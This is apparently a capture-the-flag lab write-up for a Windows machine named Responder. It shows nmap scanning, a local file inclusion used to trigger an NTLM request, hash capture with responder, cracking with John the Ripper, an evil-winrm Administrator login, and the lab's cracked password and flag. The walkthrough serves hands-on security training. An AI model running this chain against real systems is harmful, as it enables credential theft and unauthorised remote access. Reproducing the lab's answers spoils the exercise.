![Responder.jpg](/assets/responder.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.87.40
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.87.40
```

**Output**
```bash
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub
```

3. Before to access to web page we need to host the web page in `/etc/hosts`, put the **IP address machine** and the **name of web page**.

![Responder-Hosts.PNG](/assets/responder-hosts.PNG)

4. Web Page
![Responder-Web.PNG](/assets/responder-web.PNG)


5. To hack the machine use **LFI** (Local File Inclusion)

+ When change the language of web page we see that read a file.
![Responder-language.PNG](/assets/responder-laguage.PNG)

+ If the query is not sanitized, we can read any file of server.

![Responder-file.PNG](/assets/responder-LFI.PNG)



6. Use `responder` to get the password hash and name of user.

```bash
┌──(kali㉿kali)-[~]
└─$ responder -I tun0
```

**Output**
```bash
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

  ...

  [+] Listening for events... 
```


7. Do a **NTLM request**

![Responder-ntlm.PNG](/assets/responder-ntlm.PNG)

1. See in **responder** the **user name** and **password hash**

```bash
[SMB] NTLMv2-SSP Client   : 10.129.87.40
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:dceb53c72e398e88:110D4DAB0E9ED36EC98D4802880BC611:010100000000000080A7748C9DE1D801A32782C529471B0B0000000002000800410043004300340001001E00570049004E002D0054005600480058004B00300033005000310058004F0004003400570049004E002D0054005600480058004B00300033005000310058004F002E0041004300430034002E004C004F00430041004C000300140041004300430034002E004C004F00430041004C000500140041004300430034002E004C004F00430041004C000700080080A7748C9DE1D801060004000200000008003000300000000000000001000000002000002FC8D2CA6677F5F317FFEDFA0748370B02ED60EEE44058722C20D9F2A90C9BC20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310031000000000000000000 
```

9. Put the information into a file for crack with **JohnTheRipper**

```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| echo "Administrator::RESPONDER:dceb53c72e398e88:110D4DAB0E9ED36EC98D4802880BC611:010100000000000080A7748C9DE1D801A32782C529471B0B0000000002000800410043004300340001001E00570049004E002D0054005600480058004B00300033005000310058004F0004003400570049004E002D0054005600480058004B00300033005000310058004F002E0041004300430034002E004C004F00430041004C000300140041004300430034002E004C004F00430041004C000500140041004300430034002E004C004F00430041004C000700080080A7748C9DE1D801060004000200000008003000300000000000000001000000002000002FC8D2CA6677F5F317FFEDFA0748370B02ED60EEE44058722C20D9F2A90C9BC20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310031000000000000000000" > hash.txt
```
---
+ Before do this, make sure have the **rockyou.txt** in the current directory
```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| john --wordlist=rockyou.txt hash.txt
```

**Output**
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-10-16 20:31) 100.0g/s 512000p/s 512000c/s 512000C/s gators..babygrl
```

10. Now login with evil-winrm
```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| evil-winrm -u Administrator -p badminton -i 10.129.87.40
```

**Output**
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

11. **flag.txt** is in the path `C:\Users\mike\Desktop`

```bash
Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
```

**By: EsT**